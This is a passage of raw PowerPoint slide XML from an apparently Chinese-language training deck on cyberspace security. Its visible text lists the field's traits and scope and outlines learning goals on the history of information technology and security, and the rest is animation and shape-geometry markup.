            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="矩形 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="683568" y="2093084"/>
            <a:ext cx="2685351" cy="523220"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="non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网络空间</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2800" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>安全</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0">
              <a:latin typeface="+mn-lt"/>
              <a:ea typeface="+mn-ea"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="35217213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
                            </p:stCondLst>
                            <p:childTnLst>
                              <p:par>
                                <p:cTn id="10" presetID="2" presetClass="entr" presetSubtype="8"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0-#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par>
                          <p:cTn id="14" fill="hold">
                            <p:stCondLst>
                              <p:cond delay="510"/>
                            </p:stCondLst>
                            <p:childTnLst>
                              <p:par>
                                <p:cTn id="15" presetID="2" presetClass="entr" presetSubtype="8"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0-#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childTnLst>
                          </p:cTn>
                        </p:par>
                        <p:par>
                          <p:cTn id="19" fill="hold">
                            <p:stCondLst>
                              <p:cond delay="1010"/>
                            </p:stCondLst>
                            <p:childTnLst>
                              <p:par>
                                <p:cTn id="20" presetID="2" presetClass="entr" presetSubtype="8" fill="hold" nodeType="after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0-#ppt_w/2"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="23" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="15"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_y</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_y"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_y"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                  </p:childTnLst>
                                </p:cTn>
                              </p:par>
                            </p:childTnLst>
                          </p:cTn>
                        </p:par>
                        <p:par>
                          <p:cTn id="24" fill="hold">
                            <p:stCondLst>
                              <p:cond delay="1510"/>
                            </p:stCondLst>
                            <p:childTnLst>
                              <p:par>
                                <p:cTn id="25" presetID="2" presetClass="entr" presetSubtype="8"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0-#ppt_w/2"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="28" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="16"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_y</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_y"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_y"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                  </p:childTnLst>
                                </p:cTn>
                              </p:par>
                            </p:childTnLst>
                          </p:cTn>
                        </p:par>
                        <p:par>
                          <p:cTn id="29" fill="hold">
                            <p:stCondLst>
                              <p:cond delay="2010"/>
                            </p:stCondLst>
                            <p:childTnLst>
                              <p:par>
                                <p:cTn id="30" presetID="21" presetClass="entr" presetSubtype="1" fill="hold"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heel(1)">
                                      <p:cBhvr>
                                        <p:cTn id="32"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body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="791580" y="1304764"/>
            <a:ext cx="7992888" cy="1980220"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0066FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>网络空间安全特征</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0066FF"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>网络空间安全是系统的安全</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>网络空间安全是动态的安全</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>网络空间安全是无边界的安全</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>网络空间安全是非传统的安全</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26627" name="标题 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="794014" y="692696"/>
            <a:ext cx="6513512" cy="487363"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>网络空间安全的特征与范畴</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="矩形 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="791580" y="3429000"/>
            <a:ext cx="7344816" cy="2000548"/>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defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0066FF"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>网络空间安全的范畴</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2800" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0066FF"/>
              </a:solidFill>
              <a:latin typeface="+mn-lt"/>
              <a:ea typeface="+mn-ea"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="742950" lvl="1" indent="-285750" eaLnBrk="0" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="FF9900"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" pitchFamily="2" charset="2"/>
              <a:buChar char="§"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>信息技术问题</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>——</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>技术系统的安全问题</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="742950" lvl="1" indent="-285750" eaLnBrk="0" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="FF9900"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" pitchFamily="2" charset="2"/>
              <a:buChar char="§"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>组织管理问题</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>——</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>人</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>+</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>技术系统</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>+</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>组织内部环境</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defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>社会问题</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>——</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>法制、舆论</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defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>国家安全问题</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>——</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>信息战、虚拟空间</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0">
              <a:latin typeface="+mn-lt"/>
              <a:ea typeface="+mn-ea"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="16302321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6">
                                            <p:txEl>
                                              <p:pRg st="0" end="0"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="7" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="266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6626">
                                            <p:txEl>
                                              <p:pRg st="1" end="1"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="11" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="2662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662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6626">
                                            <p:txEl>
                                              <p:pRg st="2" end="2"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="15" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="2662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662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6626">
                                            <p:txEl>
                                              <p:pRg st="3" end="3"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="19" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="2662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6626">
                                            <p:txEl>
                                              <p:pRg st="4" end="4"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="23" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="2662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662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build="p"/>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标题 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="755576" y="908720"/>
            <a:ext cx="6513512" cy="487363"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>知识域：网络空间安全保障背景</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6147" name="内容占位符 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="514350" y="1752600"/>
            <a:ext cx="8378130" cy="3476600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>知识子域：</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" b="1" kern="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
              </a:rPr>
              <a:t>信息技术与</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" kern="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
              </a:rPr>
              <a:t>网络空间</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" b="1" kern="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
              </a:rPr>
              <a:t>安全发展阶段</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>了解</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>通信</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>、计算机、网络和网络化社会等阶段信息技术的发展概况</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>了解信</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>息技术</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>和网络对经济发展、社会稳定及国家安全等方面的影响</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>了解通信安全、计算机安全、信息系统安全和</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>网络空间</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>安全保障等阶段</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>网络空间</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>安全的发展概况，</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>了解各个阶段</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>网络空间</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>安全面临的主要威胁和防护措施</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="21843932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0" name="Group 38"/>
          <p:cNvGrpSpPr>
            <a:grpSpLocks/>
          </p:cNvGrpSpPr>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="1029494" y="1302345"/>
            <a:ext cx="6551613" cy="4805363"/>
            <a:chOff x="1338" y="754"/>
            <a:chExt cx="4127" cy="3027"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="51" name="Freeform 3"/>
            <p:cNvSpPr>
              <a:spLocks noEditPoints="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="gray">
            <a:xfrm>
              <a:off x="1338" y="935"/>
              <a:ext cx="4127" cy="2846"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="T0" fmla="*/ 1092 w 2820"/>
                <a:gd name="T1" fmla="*/ 50 h 2912"/>
                <a:gd name="T2" fmla="*/ 822 w 2820"/>
                <a:gd name="T3" fmla="*/ 168 h 2912"/>
                <a:gd name="T4" fmla="*/ 594 w 2820"/>
                <a:gd name="T5" fmla="*/ 300 h 2912"/>
                <a:gd name="T6" fmla="*/ 406 w 2820"/>
                <a:gd name="T7" fmla="*/ 446 h 2912"/>
                <a:gd name="T8" fmla="*/ 254 w 2820"/>
                <a:gd name="T9" fmla="*/ 604 h 2912"/>
                <a:gd name="T10" fmla="*/ 140 w 2820"/>
                <a:gd name="T11" fmla="*/ 772 h 2912"/>
                <a:gd name="T12" fmla="*/ 60 w 2820"/>
                <a:gd name="T13" fmla="*/ 944 h 2912"/>
                <a:gd name="T14" fmla="*/ 14 w 2820"/>
                <a:gd name="T15" fmla="*/ 1122 h 2912"/>
                <a:gd name="T16" fmla="*/ 0 w 2820"/>
                <a:gd name="T17" fmla="*/ 1300 h 2912"/>
                <a:gd name="T18" fmla="*/ 18 w 2820"/>
                <a:gd name="T19" fmla="*/ 1476 h 2912"/>
                <a:gd name="T20" fmla="*/ 64 w 2820"/>
                <a:gd name="T21" fmla="*/ 1650 h 2912"/>
                <a:gd name="T22" fmla="*/ 138 w 2820"/>
                <a:gd name="T23" fmla="*/ 1818 h 2912"/>
                <a:gd name="T24" fmla="*/ 238 w 2820"/>
                <a:gd name="T25" fmla="*/ 1978 h 2912"/>
                <a:gd name="T26" fmla="*/ 364 w 2820"/>
                <a:gd name="T27" fmla="*/ 2126 h 2912"/>
                <a:gd name="T28" fmla="*/ 512 w 2820"/>
                <a:gd name="T29" fmla="*/ 2262 h 2912"/>
                <a:gd name="T30" fmla="*/ 684 w 2820"/>
                <a:gd name="T31" fmla="*/ 2382 h 2912"/>
                <a:gd name="T32" fmla="*/ 874 w 2820"/>
                <a:gd name="T33" fmla="*/ 2484 h 2912"/>
                <a:gd name="T34" fmla="*/ 1086 w 2820"/>
                <a:gd name="T35" fmla="*/ 2564 h 2912"/>
                <a:gd name="T36" fmla="*/ 1314 w 2820"/>
                <a:gd name="T37" fmla="*/ 2622 h 2912"/>
                <a:gd name="T38" fmla="*/ 1558 w 2820"/>
                <a:gd name="T39" fmla="*/ 2654 h 2912"/>
                <a:gd name="T40" fmla="*/ 1818 w 2820"/>
                <a:gd name="T41" fmla="*/ 2658 h 2912"/>
                <a:gd name="T42" fmla="*/ 2090 w 2820"/>
                <a:gd name="T43" fmla="*/ 2632 h 2912"/>
                <a:gd name="T44" fmla="*/ 2374 w 2820"/>
                <a:gd name="T45" fmla="*/ 2574 h 2912"/>
                <a:gd name="T46" fmla="*/ 2544 w 2820"/>
                <a:gd name="T47" fmla="*/ 2912 h 2912"/>
                <a:gd name="T48" fmla="*/ 1868 w 2820"/>
                <a:gd name="T49" fmla="*/ 1552 h 2912"/>
                <a:gd name="T50" fmla="*/ 1956 w 2820"/>
                <a:gd name="T51" fmla="*/ 1914 h 2912"/>
                <a:gd name="T52" fmla="*/ 1788 w 2820"/>
                <a:gd name="T53" fmla="*/ 1936 h 2912"/>
                <a:gd name="T54" fmla="*/ 1616 w 2820"/>
                <a:gd name="T55" fmla="*/ 1934 h 2912"/>
                <a:gd name="T56" fmla="*/ 1442 w 2820"/>
                <a:gd name="T57" fmla="*/ 1912 h 2912"/>
                <a:gd name="T58" fmla="*/ 1272 w 2820"/>
                <a:gd name="T59" fmla="*/ 1872 h 2912"/>
                <a:gd name="T60" fmla="*/ 1108 w 2820"/>
                <a:gd name="T61" fmla="*/ 1812 h 2912"/>
                <a:gd name="T62" fmla="*/ 952 w 2820"/>
                <a:gd name="T63" fmla="*/ 1736 h 2912"/>
                <a:gd name="T64" fmla="*/ 810 w 2820"/>
                <a:gd name="T65" fmla="*/ 1646 h 2912"/>
                <a:gd name="T66" fmla="*/ 684 w 2820"/>
                <a:gd name="T67" fmla="*/ 1542 h 2912"/>
                <a:gd name="T68" fmla="*/ 578 w 2820"/>
                <a:gd name="T69" fmla="*/ 1428 h 2912"/>
                <a:gd name="T70" fmla="*/ 494 w 2820"/>
                <a:gd name="T71" fmla="*/ 1304 h 2912"/>
                <a:gd name="T72" fmla="*/ 438 w 2820"/>
                <a:gd name="T73" fmla="*/ 1170 h 2912"/>
                <a:gd name="T74" fmla="*/ 410 w 2820"/>
                <a:gd name="T75" fmla="*/ 1032 h 2912"/>
                <a:gd name="T76" fmla="*/ 416 w 2820"/>
                <a:gd name="T77" fmla="*/ 888 h 2912"/>
                <a:gd name="T78" fmla="*/ 460 w 2820"/>
                <a:gd name="T79" fmla="*/ 742 h 2912"/>
                <a:gd name="T80" fmla="*/ 544 w 2820"/>
                <a:gd name="T81" fmla="*/ 592 h 2912"/>
                <a:gd name="T82" fmla="*/ 670 w 2820"/>
                <a:gd name="T83" fmla="*/ 444 h 2912"/>
                <a:gd name="T84" fmla="*/ 844 w 2820"/>
                <a:gd name="T85" fmla="*/ 298 h 2912"/>
                <a:gd name="T86" fmla="*/ 1070 w 2820"/>
                <a:gd name="T87" fmla="*/ 154 h 2912"/>
                <a:gd name="T88" fmla="*/ 1348 w 2820"/>
                <a:gd name="T89" fmla="*/ 16 h 2912"/>
                <a:gd name="T90" fmla="*/ 1244 w 2820"/>
                <a:gd name="T91" fmla="*/ 0 h 2912"/>
                <a:gd name="T92" fmla="*/ 2820 w 2820"/>
                <a:gd name="T93" fmla="*/ 1934 h 2912"/>
                <a:gd name="T94" fmla="*/ 2820 w 2820"/>
                <a:gd name="T95" fmla="*/ 1934 h 291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820"/>
                <a:gd name="T145" fmla="*/ 0 h 2912"/>
                <a:gd name="T146" fmla="*/ 2820 w 2820"/>
                <a:gd name="T147" fmla="*/ 2912 h 291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820" h="2912">
                  <a:moveTo>
                    <a:pt x="1244" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="1092" y="50"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="952" y="106"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="822" y="168"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="704" y="232"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="594" y="300"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="494" y="372"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="406" y="446"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="324" y="524"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="254" y="604"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="192" y="686"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="140" y="772"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="96" y="856"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="60" y="944"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="32" y="1032"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14" y="1122"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2" y="1210"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="1300"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4" y="1388"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="18" y="1476"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="36" y="1564"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="64" y="1650"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="96" y="1736"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="138" y="1818"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="184" y="1900"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="238" y="1978"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="298" y="2054"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="364" y="2126"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="434" y="2196"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="512" y="2262"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="596" y="2324"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="684" y="2382"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="776" y="2436"/>
                  </a:lnTo>
